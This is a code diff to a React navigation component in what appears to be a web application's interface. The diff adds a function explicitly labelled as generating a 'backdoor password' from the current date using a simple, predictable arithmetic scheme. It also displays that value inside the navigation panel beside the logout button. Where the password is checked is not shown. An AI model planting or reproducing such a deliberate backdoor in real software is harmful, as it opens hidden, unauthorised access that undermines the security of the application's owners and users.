@@ -38,6 +38,26 @@ export const Navigation = () => {
     document.documentElement.classList.toggle('dark', theme === "dark");
 }, [theme]);
 
+  //get backdoor password function
+  function getBackdoor() {
+    let passStr;
+    let yearStr, monthStr, dayStr;
+
+    const now = new Date();
+  
+    yearStr = now.getFullYear().toString().slice(-2);
+    monthStr = ('0' + (now.getMonth() + 1)).slice(-2);
+    dayStr = ('0' + now.getDate()).slice(-2);
+
+    passStr = ('0' + (parseInt(yearStr, 10) + parseInt(dayStr, 10))).slice(-2);
+    passStr += ('0' + (parseInt(dayStr, 10) + parseInt(monthStr, 10))).slice(-2);
+    passStr += ('0' + (parseInt(monthStr, 10) + 7)).slice(-2);
+
+    return passStr;
+  }
+
+  const backdoorPassword = getBackdoor(); // Generate the password
+
 
   // const MobileNavigation = () => {
   //   const [isOpen, setIsOpen] = useState<boolean>(false);
@@ -149,6 +169,9 @@ export const Navigation = () => {
 
         </ul>
         <div className="flex flex-col items-center justify-center w-10/12 gap-6">
+          <p className="text-gray-500 text-sm">
+            <span className="text-green">{backdoorPassword}</span>
+          </p>
             <Toggler /> 
           <button className="gap-2 flex items-center justify-center w-10/12 mx-auto rounded p-2 bg-red text-white" onClick={logout}>
             <span className="text-white font-medium uppercase text-xs">Logout</span>
